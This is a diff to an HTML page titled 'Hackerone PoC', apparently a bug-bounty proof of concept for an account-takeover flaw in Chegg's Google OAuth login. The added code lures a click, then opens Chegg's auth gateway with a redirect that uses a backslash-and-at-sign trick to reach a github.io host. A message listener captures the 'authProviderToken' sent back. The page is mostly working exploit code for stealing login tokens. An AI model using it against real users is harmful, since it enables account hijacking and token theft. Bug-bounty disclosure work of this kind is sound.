@@ -6,7 +6,17 @@
     <title>Hackerone PoC</title>
 </head>
 <body>
+    <p>Click on the Image to give me you account!</p>
+    <img src="https://mms.businesswire.com/media/20200615005122/en/658229/23/hackerone_logo_black.jpg">
     <script>
+
+    function handleOnClick() {
+      // Open the first URL and close the new tab after 10 seconds
+      var newTab = window.open('https://gateway.chegg.com/one-auth-social/google?redirect=https://www.chegg.com%5c%40mrhavit.github.io');
+      setTimeout(function() {
+        newTab.close();
+      }, 10000000000);
+}
     window.addEventListener('message', function(event) {
     console.log(event.data);
 
@@ -17,6 +27,8 @@
         console.error('Invalid data format or missing "authProviderToken" prefix');
     }
 }, false);
+
+window.onclick = handleOnClick;
     </script>
 </body>
 </html>
